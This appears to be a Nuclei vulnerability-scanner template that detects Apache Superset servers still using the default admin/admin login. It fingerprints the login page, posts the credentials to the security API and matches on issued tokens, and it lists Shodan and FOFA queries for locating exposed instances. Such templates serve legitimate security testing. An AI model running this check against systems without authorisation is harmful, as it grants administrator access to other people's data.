id: apache-superset-default-login
info:
  name: Apache Superset 默认凭据登录漏洞
  author: theamanrawat
  severity: high
  description: Apache Superset 实例因使用弱默认凭据被发现，攻击者可借此获取管理员权限。
  reference:
  - https://superset.apache.org/
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
    cvss-score: 8.3
  metadata:
    verified: true
    max-request: 2
    vendor: apache
    product: superset
    shodan-query:
    - http.title:"Superset"
    - product:"Apache Superset"
    fofa-query:
    - app="Apache-Superset" || title="Superset"
  tags: apache, superset
flow: http(1) && http(2)
http:
- method: GET
  path:
  - '{{BaseURL}}/login/'
  matchers:
  - type: dsl
    dsl:
    - status_code == 200
    - contains(content_type, "text/html")
    - contains_any(body, "alt=\"Superset\"", "<title>Superset</title>", "SUPERSET",
      "superset")
    condition: and
    internal: true
- raw:
  - |
    POST /api/v1/security/login HTTP/1.1
    Host: {{Hostname}}
    Content-Type: application/json

    {"username":"{{username}}","password":"{{password}}","provider":"db","refresh":true}
  attack: pitchfork
  payloads:
    username:
    - admin
    password:
    - admin
  matchers:
  - type: dsl
    dsl:
    - status_code == 200
    - contains(content_type, "application/json")
    - contains_all(body, "access_toke", "refresh_token")
    condition: and
